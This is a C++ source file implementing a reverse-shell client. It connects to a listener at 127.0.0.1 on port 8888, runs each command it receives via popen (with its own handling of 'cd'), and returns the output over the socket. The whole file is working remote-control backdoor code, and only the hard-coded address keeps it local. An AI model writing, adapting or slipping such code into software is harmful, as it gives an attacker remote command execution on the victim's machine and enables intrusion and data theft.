#include <iostream>
#include <thread>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <memory>
#include <filesystem>

std::string currentDirectory = std::filesystem::current_path();  // track current directory

std::string exec(const std::string& cmd) {
    std::string fullCmd = "cd \"" + currentDirectory + "\" && " + cmd;
    std::shared_ptr<FILE> pipe(popen(fullCmd.c_str(), "r"), pclose);
    if (!pipe) return "ERROR\n";
    char buffer[128];
    std::string result;
    while (fgets(buffer, sizeof(buffer), pipe.get()) != NULL) {
        std::cout << buffer << std::endl;
        result += buffer;
    }
    return result;
}

void receive_loop(int clientfd) {
    char buffer[1024];
    while (true) {
        int bytes = recv(clientfd, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) {
            break;
        }
        buffer[bytes] = '\0';

        std::string command(buffer);
        std::string output;

        // Handle 'cd' command manually
        if (command.substr(0, 3) == "cd ") {
            std::string path = command.substr(3);
            std::filesystem::path newPath = std::filesystem::weakly_canonical(std::filesystem::path(currentDirectory) / path);
            if (std::filesystem::exists(newPath) && std::filesystem::is_directory(newPath)) {
                currentDirectory = newPath;
                output = "Changed directory to: " + currentDirectory + "\n";
            } else {
                output = "Directory not found: " + path + "\n";
            }
        } else {
            // Execute other commands from the current directory
            output = exec(command);
        }

        if (send(clientfd, output.c_str(), output.length(), 0) < 0) {
            std::cerr << "Failed to send command output\n";
            break;
        }
    }
}

int main() {
    const char *errMsg = "Connection failed\n";
    int clientfd = socket(AF_INET, SOCK_STREAM, 0);
    if (clientfd < 0) {
        return -1;
    }


    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8888);
    inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr);

    if (connect(clientfd, (sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        send(clientfd, errMsg, strlen(errMsg), 0);
        return -1;
    }

    receive_loop(clientfd);

    close(clientfd);
    return 0;
}
